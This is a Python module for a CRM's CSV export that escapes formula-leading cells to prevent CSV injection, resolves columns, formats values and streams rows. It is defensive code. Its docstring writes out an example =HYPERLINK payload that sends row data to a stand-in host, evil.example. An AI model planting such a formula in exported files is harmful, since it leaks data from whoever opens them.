"""CSV export: cell escaping, column resolution, formatting. CRM-235 / CRM-236.

⚠️ **CSV INJECTION IS THE REASON THIS MODULE EXISTS.**

A cell whose text begins with ``=``, ``+``, ``@`` or a control character is
evaluated as a *formula* when the file is opened in Excel, LibreOffice or
Sheets. So a company named::

    =HYPERLINK("https://evil.example/?d="&A1&A2, "Click for invoice")

is not a company name — it is code that runs on the machine of whoever opens
the export, with their credentials, exfiltrating the rest of the row. The
attacker never needs access to the CRM: a lead who fills in a public web form,
or one row of a list someone else imported, is enough. The victim is whoever
clicks Export, which is usually the most senior person in the account.

Every value that leaves this module is escaped by ``escape_cell``. Quoting does
NOT help — Excel evaluates the contents of a quoted field just the same.

**Escaping must be reversible**, because §10.2's whole point is that an export
can be edited and re-imported to update the records it came from. A one-way
mangling would corrupt a name on the round trip. ``unescape_cell`` is the exact
inverse, and the import worker applies it.

**Negative numbers are not attacks.** ``-1500`` is a legitimate amount, and
escaping every leading ``-`` would put an apostrophe in front of every negative
figure in every export. Only a leading ``-`` that is *not* part of a number is
treated as dangerous.

Stdlib only. No DB, no pydantic.
"""
from __future__ import annotations

import csv
import re
from datetime import date, datetime, timezone
from typing import Any, Dict, Iterable, List, Optional, Sequence, Tuple

SEPARATORS = (",", ";")
DEFAULT_SEPARATOR = ","

# The characters a spreadsheet treats as "this cell is a formula".
# Tab and carriage return are here because both can begin a formula once the
# leading whitespace is stripped by the parser.
_FORMULA_PREFIXES = ("=", "+", "@", "\t", "\r")

# The marker prepended to a dangerous cell. A single quote is the conventional
# "this is text" prefix; it is stripped again by unescape_cell on the way back.
_ESCAPE = "'"

_NUMERIC = re.compile(r"^-?\d[\d,]*\.?\d*$")

# Always present, always first. The id is what makes update-by-re-import
# possible (§10.2) — a user has no other way to obtain it, and without it an
# edited export can only ever create new records.
ALWAYS_COLUMNS = ("id", "name")

# The system columns each entity type has, used when an account has no
# attribute definitions yet (CRM-208's backward-compatibility state). Without
# this an export from a fresh account would contain nothing but ID and Name,
# which is not an export — it is a list of ids.
SYSTEM_COLUMNS = {
    "company": (
        ("domain", "Domain"), ("website", "Website"), ("industry", "Industry"),
        ("employee_count", "Employee count"), ("annual_revenue", "Annual revenue"),
        ("currency", "Currency"), ("phone", "Phone"), ("description", "Description"),
        ("owner_id", "Owner"), ("created_at", "Created at"),
        # Denormalised counters. Read-only, no attribute row describes
        # them, and the companies list has shown them since Phase 1 —
        # so a layout that includes them must survive into the export.
        ("contact_count", "Contacts"), ("deal_count", "Leads"),
        ("open_deal_value", "Open lead value"),
        ("last_activity_at", "Last activity"),
    ),
    "deal": (
        ("amount", "Amount"), ("currency", "Currency"), ("status", "Status"),
        ("expected_close_date", "Expected close date"),
        ("actual_close_date", "Actual close date"),
        ("primary_company_name", "Company"), ("owner_id", "Owner"),
        ("description", "Description"), ("created_at", "Created at"),
        ("last_activity_at", "Last activity"),
    ),
}

# Never exportable in Phase 2: each is unbounded per record and has its own
# endpoint. One company with 400 activities would otherwise produce 400 rows or
# one unreadable cell.
NEVER_COLUMNS = frozenset({
    "notes", "files", "activities", "emails", "custom_fields", "storage_key",
})


def looks_dangerous(value: str) -> bool:
    """Would a spreadsheet treat this cell as a formula?"""
    if not value:
        return False
    text = str(value)
    if text[0] in _FORMULA_PREFIXES:
        return True
    if text[0] == "-":
        # A negative number is data; "-2+3" is a formula. Only escape when it
        # is not a plain number, so exports do not sprout an apostrophe in
        # front of every negative amount.
        return not _NUMERIC.match(text)
    return False


def escape_cell(value: Any) -> str:
    """Make one value safe to open in a spreadsheet. Reversible."""
    if value is None:
        return ""
    text = str(value)
    if looks_dangerous(text):
        return _ESCAPE + text
    return text


def unescape_cell(value: Any) -> str:
    """The exact inverse of ``escape_cell``.

    Only strips the marker when what follows would itself have been escaped, so
    a company genuinely called ``'Quoted'`` survives the round trip intact.
    """
    if value is None:
        return ""
    text = str(value)
    if text.startswith(_ESCAPE) and looks_dangerous(text[1:]):
        return text[1:]
    return text


# ── formatting ───────────────────────────────────────────────────────────────
def format_value(value: Any, tz_name: Optional[str] = None) -> str:
    """One stored value as a CSV cell, before escaping.

    Datetimes go out as ISO-8601 **with an offset**, in the account's timezone.
    Unambiguous in a way that "15/08/2026 14:30" is not — that string means two
    different days depending on who opens it — and it survives a re-import.
    """
    if value is None:
        return ""
    if isinstance(value, bool):
        # Before the int branch: bool IS an int in Python, so "True" would
        # otherwise export as "1" and re-import as the number one.
        return "true" if value else "false"
    if isinstance(value, datetime):
        return _as_local(value, tz_name).isoformat(timespec="seconds")
    if isinstance(value, date):
        return value.isoformat()
    if isinstance(value, (list, tuple, set)):
        # Joined with "; " rather than the CSV separator. The writer quotes the
        # field either way, but a value that contains the separator is the
        # commonest way an export opens with its columns shifted.
        return "; ".join(format_value(v, tz_name) for v in value if v is not None)
    if isinstance(value, dict):
        return "; ".join(f"{k}={format_value(v, tz_name)}"
                         for k, v in value.items() if v is not None)
    return str(value)


def _as_local(value: datetime, tz_name: Optional[str]):
    """Naive values out of Mongo are UTC; convert to the account's zone."""
    from app.services import task_rules as tr

    aware = value if value.tzinfo else value.replace(tzinfo=timezone.utc)
    return aware.astimezone(tr.resolve_zone(tz_name))


# ── columns ──────────────────────────────────────────────────────────────────
def resolve_columns(requested: Optional[Sequence[str]],
                    attributes: Sequence[Any],
                    entity_type: str = "company") -> List[Tuple[str, str]]:
    """``[(internal_name, header_label)]`` for the export, in order.

    ``id`` and ``name`` are forced to the front whatever was asked for. Dropping
    the id would make the file un-re-importable, and a user who deselected it by
    accident would not find out until the update-by-re-import silently created
    a second copy of everything.

    An unknown requested column is ignored rather than exported as an empty
    one — a header with nothing under it reads as missing data.
    """
    labels: Dict[str, str] = {"id": "ID", "name": "Name"}
    order: List[str] = []
    # The static system columns first, so an account with no attribute
    # definitions still gets a usable file. An account that HAS definitions
    # overrides these labels below — its own labels are what its screens show.
    for internal, label in SYSTEM_COLUMNS.get(entity_type, ()):
        labels[internal] = label
        order.append(internal)

    for attribute in attributes or []:
        internal = _get(attribute, "internal_name")
        if not internal or internal in NEVER_COLUMNS:
            continue
        labels[internal] = _get(attribute, "label") or internal
        if internal not in ALWAYS_COLUMNS and internal not in order:
            order.append(internal)

    if requested:
        wanted = [c for c in requested
                  if c in labels and c not in ALWAYS_COLUMNS
                  and c not in NEVER_COLUMNS]
    else:
        wanted = order

    seen = set()
    columns: List[Tuple[str, str]] = []
    for internal in [*ALWAYS_COLUMNS, *wanted]:
        if internal in seen:
            continue
        seen.add(internal)
        columns.append((internal, labels.get(internal, internal)))
    return columns


def row_values(record: Any, columns: Sequence[Tuple[str, str]],
               tz_name: Optional[str] = None) -> List[str]:
    """One record as a list of escaped cells."""
    custom = _get(record, "custom_fields") or {}
    out: List[str] = []
    for internal, _label in columns:
        if internal == "id":
            raw = _get(record, "id")
        elif hasattr(record, internal) or (isinstance(record, dict)
                                           and internal in record):
            raw = _get(record, internal)
        else:
            raw = custom.get(internal)
        out.append(escape_cell(format_value(raw, tz_name)))
    return out


# ── writing ──────────────────────────────────────────────────────────────────
def make_writer(handle, separator: str = DEFAULT_SEPARATOR):
    """A csv writer with the separator the user chose.

    ``\\r\\n`` line endings: Excel on Windows still renders a lone ``\\n`` as one
    long line in some locales, and the RFC specifies CRLF.
    """
    if separator not in SEPARATORS:
        separator = DEFAULT_SEPARATOR
    return csv.writer(handle, delimiter=separator, lineterminator="\r\n",
                      quoting=csv.QUOTE_MINIMAL)


BOM = "﻿"


def header_row(columns: Sequence[Tuple[str, str]]) -> List[str]:
    return [label for _internal, label in columns]


def filename(entity_type: str, when: datetime, *, filtered: bool = False) -> str:
    """``companies-filtered-2026-08-15.csv``.

    The word "filtered" is in the name on purpose: an export of a filtered list
    that is indistinguishable from a full one is how somebody later concludes
    the account has 412 companies when it has 9,000.
    """
    stamp = when.strftime("%Y-%m-%d")
    kind = "deals" if entity_type == "deal" else "companies"
    return f"{kind}-{'filtered-' if filtered else ''}{stamp}.csv"


def describe_filters(filters: Optional[Dict[str, Any]]) -> str:
    """A human summary of what was exported, for the job record and the UI.

    Stored with the job so that a file downloaded a week later can still say
    what it contains.
    """
    if not filters:
        return "All records"
    parts = []
    for key, value in sorted(filters.items()):
        if value in (None, "", [], False):
            continue
        if key == "q":
            parts.append(f'search "{value}"')
        elif key == "record_ids":
            parts.append(f"{len(value):,} selected records")
        elif isinstance(value, (list, tuple)):
            parts.append(f"{key.replace('_', ' ')}: {len(value)} selected")
        else:
            parts.append(f"{key.replace('_', ' ')}: {value}")
    return ", ".join(parts) if parts else "All records"


def _get(obj: Any, field: str, default: Any = None) -> Any:
    if isinstance(obj, dict):
        return obj.get(field, default)
    return getattr(obj, field, default)


def write_rows(writer, columns: Sequence[Tuple[str, str]],
               records: Iterable[Any], tz_name: Optional[str] = None) -> int:
    """Write a page of records into an open writer. Returns the row count.

    Takes a writer rather than returning a string: the AC says stream, and
    building the whole file in memory is what streaming is defined against. A
    50,000-record account with 40 columns is a few hundred megabytes as one
    Python string.
    """
    count = 0
    for record in records:
        writer.writerow(row_values(record, columns, tz_name))
        count += 1
    return count
